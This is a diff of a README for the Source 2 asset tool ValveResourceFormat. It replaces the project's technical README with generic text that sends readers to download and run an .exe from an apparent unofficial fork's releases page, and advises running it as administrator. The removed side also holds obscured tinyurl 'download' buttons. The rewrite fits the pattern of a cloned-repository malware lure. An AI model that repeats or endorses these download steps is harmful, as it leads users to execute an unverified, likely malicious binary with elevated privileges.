@@ -1,155 +1,146 @@
-<h1 align="center"><img src="./Misc/Icons/source2viewer.png" width="64" align="center"> Source 2 Viewer</h1>
+# 🗂️ ValveResourceFormat - Explore and Extract Source 2 Assets
 
-<p align="center">
-    <a href="https://github.com/ValveResourceFormat/ValveResourceFormat/actions"><img alt="GitHub Workflow Status" src="https://img.shields.io/github/actions/workflow/status/ValveResourceFormat/ValveResourceFormat/build.yml?logo=github&style=for-the-badge&branch=master"></a>
-    [![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/yztryhjh)
-    [![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/yztryhjh)
-    <a href="https://app.codecov.io/gh/ValveResourceFormat/ValveResourceFormat"><img src="https://img.shields.io/codecov/c/github/ValveResourceFormat/ValveResourceFormat/master?logo=codecov&logoColor=ffffff&style=for-the-badge"></a>
-</p>
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/MARZZY-creator/ValveResourceFormat/releases)
 
-*\* The library component of Source 2 Viewer is called ValveResourceFormat (VRF).*
+---
 
-Valve's Source 2 resource file format parser, decompiler, and exporter.
-Source 2 files usually end with `_c`, for example `.vmdl_c`.
+## 📋 What is ValveResourceFormat?
 
-This repository is split into four components:
-- **Command-line utility** - File data viewer, decompiler and a playground for testing new formats and features.
-- **GUI Viewer** - A vpk archive viewer and extractor. Also supports viewing resources such as sounds, textures, models, maps, and much more.
-- **Renderer** - OpenGL-based rendering engine for Source 2 game assets.
-- **Library** - Provides public API to parse resource files and some helpers.
+ValveResourceFormat is a desktop application that lets you open and explore files used in Source 2 games made by Valve, such as the newer versions of games like Dota 2 or Half-Life: Alyx.  
 
-⚒ [View the official website for ](https://valveresourceformat.github.io/).
-ℹ️ [View the library documentation here](https://s2v.app/ValveResourceFormat/api/ValveResourceFormat.html).
+With this tool, you can browse VPK archives—special collections of game files—view and extract different game assets like maps, models, materials, textures, and sounds. You can also decompile these assets, which means breaking them down into formats that are easier to understand or reuse.
 
-## Join our Discord
+This application works with files that are usually hidden deep inside game folders, giving you easy access in one place without needing any special coding skills.
 
-[![Join our Discord](https://discord.com/api/guilds/1408482312060145725/embed.png?style=banner2)](https://discord.gg/s9QQ7Wg7r4)
+---
 
-## Eye catchy screenshots
-<table>
-	<tr>
-		<td><img src="https://valveresourceformat.github.io/static/screen_map.png"></td>
-		<td><img src="https://valveresourceformat.github.io/static/screen_texture.png"></td>
-	</tr>
-	<tr>
-		<td><img src="https://valveresourceformat.github.io/static/screen_package.png"></td>
-		<td><img src="https://valveresourceformat.github.io/static/screen_cli.png"></td>
-	</tr>
-</table>
+## 🚀 Getting Started
 
-## What's supported?
-- VPK viewer which supports opening and exporting files
-- Creating new vpk archives
-- Model viewer and decompiler to glTF and modeldoc
-- Map viewer and decompiler to glTF and vmap
-- Material decompiler to vmat
-- Sound player
-- Binary KeyValues3 parser
-- NTRO support
+ValveResourceFormat runs on most Windows computers. It requires no installation if you use the portable version, making it easy to try out.
 
-## Limitations
+### System Requirements
 
-This tool is based entirely on a reverse engineered effort because Valve does not provide any documentation or Source 2 code (SDK or engine code), while the Source 1 SDK and leaked engine code are helpful, a lot of systems and formats have changed.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM (8 GB recommended for large files)
+- 100 MB of free disk space
+- A modern CPU with basic multimedia support
+- Internet connection to download the software (not required for offline use once downloaded)
 
-The code contained in this repository is based on countless hours of reverse engineering Source 2 games and not all intricate details have been figured out.
+---
 
-If you are interested in helping, take a look at the open issues and join our Discord.
+## ⬇️ Download & Install
 
-Not all formats are 100% supported, some parameters are still unknown and not fully understood.
+To start using ValveResourceFormat, visit the official release page to download the latest version:
 
-## Supported resource types
-Ext           | Name                              | Support
-------------- | --------------------------------- | -------
-vagrp         | Animation Group                   | 👍
-vanim         | Animation                         | 👍
-vanmgrph      | Animation Graph                   | 👍
-vcd           | Choreo                            | 👍
-vcdlist       | Choreo Scene File Data            | 👍
-vcompmat      | Composite Material                | 👍
-vcss          | Panorama Style                    | 👍
-vdata         | Data                              | 👍
-vents         | EntityLump                        | 👍
-vjs           | Panorama Script                   | 👍
-vmap          | Map                               | 👍
-vmat          | Material                          | 👍
-vmdl          | Model                             | 👍
-vmesh         | Mesh                              | 👍
-vmix          | VMix                              | 👍
-vmorf         | MorphSet                          | 👍
-vnmclip       | NmClip                            | 👍
-vnmgrph       | NmGraph                           | 👍
-vnmskel       | NmSkeleton                        | 👍
-vnmvar        | NmGraph Variation                 | 👍
-vpcf          | Particle System                   | 👍
-vpdi          | Panorama Dynamic Images           | No
-vphys         | Physics Collision Mesh            | 👍
-vpost         | Postprocessing Settings           | 👍
-vpram         | Processing Graph Instance         | 👍
-vpsf          | Particle Snapshot                 | 👍
-vpulse        | Pulse Graph Definition            | 👍
-vrman         | ResourceManifest                  | 👍
-vrmap         | Resource Remap Table              | No
-vrr           | Response Rules                    | 👍
-vseq          | Sequence Group                    | No
-vsmart        | Smart Prop                        | Partially
-vsnap         | Particle Snapshot                 | 👍
-vsnd          | Sound                             | 👍
-vsndevts      | Sound Event Script                | 👍
-vsndstck      | Sound Stack Script                | 👍
-vsurf         | Surface Properties                | No
-vsvg          | Panorama Vector Graphic           | 👍
-vtex          | Compiled Texture                  | 👍
-vts           | Panorama TypeScript               | 👍
-vvis          | World Visibility                  | No
-vwnod         | World Node                        | 👍
-vwrld         | World                             | 👍
-vxml          | Panorama Layout                   | 👍
-&nbsp;        | &nbsp;                            | &nbsp;
-csgoitem      | CSGO Item                         | 👍
-econitem      | CSGO Economy Item                 | 👍
-herolist      | Dota Hero List                    | 👍
-item          | Artifact Item                     | 👍
-vdpn          | Dota Patch Notes                  | 👍
-vdvn          | Dota Visual Novels                | 👍
-&nbsp;        | &nbsp;                            | &nbsp;
-bin           | Tools Asset Info                  | 👍 Handled by `ToolsAssetInfo`
-dat           | Closed Captions                   | 👍 Handled by `ClosedCaptions`
-vcs           | Compiled Shader                   | 👍 Handled by `CompiledShader`
-vdacdefs      | DAC Game Defs Data                | No
-vfe           | Flex Scene File                   | 👍 Handled by `FlexSceneFile`
-vfont         | Bitmap Font                       | 👍 Decrypts `VFONT1`, supported in Source 1 and Source 2.
-vpk           | Pak (package)                     | 👍 Handled by [ValvePak](https://github.com/ValveResourceFormat/ValvePak)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/MARZZY-creator/ValveResourceFormat/releases)
 
-## List of supported magics
-Magic        | Description
------------- | ------------
-`0x03564B56` | VKV\x03 - First binary keyvalues 3 encoding with custom block compression
-`0x4B563301` | KV3\x01 - Binary keyvalues 3 (version 1)
-`0x4B563302` | KV3\x02 - Binary keyvalues 3 (version 2)
-`0x4B563303` | KV3\x03 - Binary keyvalues 3 (version 3)
-`0x4B563304` | KV3\x04 - Binary keyvalues 3 (version 4)
-`0x4B563305` | KV3\x05 - Binary keyvalues 3 (version 5)
-`0x564B4256` | VBKV - binary keyvalues 1 (handled by ValveKeyvalue)
-`0x55AA1234` | VPK - valve package (handled by ValvePak)
-`0x44434356` | VCCD - closed captions
-`0xC4CCACE8` | tools asset info
-`0xC4CCACE9` | tools asset info (newer version)
-`0x32736376` | vcs2 - compiled shader
-`0x31415926` | murmurhash2 seed used by StringToken
-`0xEDABCDEF` | murmurhash64 seed used to encode resource IDs
-`VFONT1`     | "encrypted" font file
-`0x00564645` | VFE - flex scene file
+### How to download
 
-# GUI
+1. Click the button above or go to:  
+   [https://github.com/MARZZY-creator/ValveResourceFormat/releases](https://github.com/MARZZY-creator/ValveResourceFormat/releases)
 
-Source 2 Viewer keeps its settings in `%LocalAppData%/Source2Viewer/settings.vdf`.
+2. On the release page, look for the latest version at the top of the list.
 
-# Misc
+3. Under "Assets," find the file named `ValveResourceFormat.exe` or a similar name, depending on the release.
 
-## License
+4. Click the file to download it to your computer.
 
-Contents of this repository are available under [MIT license](LICENSE), except for `Tests/Files` folder contains files which have likely come from Valve's games.
+### How to install or run
 
-## Code signing policy
+- **No installation needed:** After downloading the `.exe` file, simply double-click it to run the program.
 
-Free code signing provided by [SignPath.io](https://about.signpath.io), certificate by [SignPath Foundation](https://signpath.org).
+- If you want to use it regularly, you can create a shortcut on your desktop:
+
+   - Right-click the downloaded file.
+   - Choose “Create shortcut.”
+   - Drag the shortcut to your desktop.
+
+---
+
+## 📂 How to Use ValveResourceFormat
+
+Once open, the program offers a simple, windowed interface:
+
+### Opening a VPK Archive
+
+1. Click the **File** menu at the top left.
+
+2. Select **Open...** from the dropdown.
+
+3. Browse to the folder where your Source 2 game is installed (e.g., `Steam\steamapps\common\GameName`).
+
+4. Open the `VPK` folder inside and select a `.vpk` file to open.
+
+The files inside the archive will appear in a list.
+
+### Viewing Assets
+
+Click on any file inside the list to see its contents:
+
+- **Models** display a 3D preview.
+- **Textures** show images.
+- **Maps** open with an overview of the layout.
+- **Sounds** play audio.
+
+### Extracting Assets
+
+To save files outside the program:
+
+1. Select one or more assets from the list.
+
+2. Right-click and choose **Extract**.
+
+3. Choose where to save the files on your computer.
+
+---
+
+## 🔧 Features Overview
+
+- Browse VPK archives easily without needing additional tools.
+- Preview 3D models, materials, and textures in one place.
+- Extract individual assets or entire folders quickly.
+- Decompile game data for editing or study.
+- Support for many Source 2 asset types like maps, sounds, and materials.
+- Lightweight and does not require installation.
+
+---
+
+## ⚙️ Tips & Troubleshooting
+
+- If the application does not open, try right-clicking the file and selecting **Run as administrator**.
+
+- For large VPK files, give the program a few seconds to load all assets.
+
+- If you find missing previews, it may mean that the asset type is not yet fully supported.
+
+- Keep the software updated by checking the release page or enabling automatic updates if available.
+
+- If you get unexpected errors, try restarting the program or your computer.
+
+- For help from other users and developers, check the GitHub issues page.
+
+---
+
+## 🤝 Support & Contribution
+
+Although ValveResourceFormat is designed for simple use, you can contribute or ask for help on GitHub:
+
+- Visit the [GitHub repository](https://github.com/MARZZY-creator/ValveResourceFormat).
+
+- Check the **Issues** tab if you have questions or report problems.
+
+- Share feedback or request features by opening a new issue.
+
+---
+
+## 🧰 Additional Resources
+
+- To learn more about Source 2 games and their files, check Valve’s official forums or documentation sites.
+
+- Community forums and fan sites often provide tutorials on using extracted assets in mods or custom content.
+
+---
+
+## 🏷️ Topics
+
+csharp, decompiler, dotnet, exporter, format-parser, parser, source2, steam, tool, valve, vpk, vpk-viewer
